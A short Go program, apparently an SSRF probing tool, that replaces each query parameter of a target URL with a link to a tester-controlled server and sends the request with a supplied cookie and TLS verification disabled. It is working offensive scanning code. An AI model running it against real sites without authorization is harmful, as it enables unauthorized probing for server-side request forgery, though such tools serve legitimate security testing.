package main
 
import (
    "time"
    "fmt"
    "os"
    "net/url"
    "net/http"
    "log"
//    "net/http/httputil"
    "io/ioutil"
    "crypto/tls"
    "strings"
)
 
func ssrf(link,cook string){

               http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}
               client := &http.Client{}
               req, err := http.NewRequest("GET",link, nil)
               req.Header.Add("Cookie", cook)
               start := time.Now()
               res, err := client.Do(req) 
               if err != nil{
                  log.Fatal(err)
               }
               t:=time.Since(start).Seconds()
              
//               requestDump, err := httputil.DumpRequest(req, true)
//               if err != nil {
//                   fmt.Println(err)
//               }
//               fmt.Println(string(requestDump))
//               fmt.Println(link,res.StatusCode,t)
               reqBody, err := ioutil.ReadAll(res.Body)
               if err != nil {
                            log.Fatal(err)
               }
//               fmt.Printf("%s", reqBody)
               fmt.Println(link,res.StatusCode,t,len(reqBody))

}

func main() {
 
               str := os.Args[1] 
               server_test := os.Args[2] 
               cookie:=os.Args[3]
               u, _ := url.Parse(str)
               res1 := strings.Replace(u.Host, ".", "_",-1)
               server1:=server_test+"/"+res1
               q, _ := url.ParseQuery(u.RawQuery)
               for key := range q {
                   q.Set(key,server1+"_"+key+".txt")
               }

               u.RawQuery = q.Encode()
               l:=u.String()
               if cookie == "1" {
                     ssrf(l,"test")
               }else{
                     ssrf(l,cookie)
               }



}





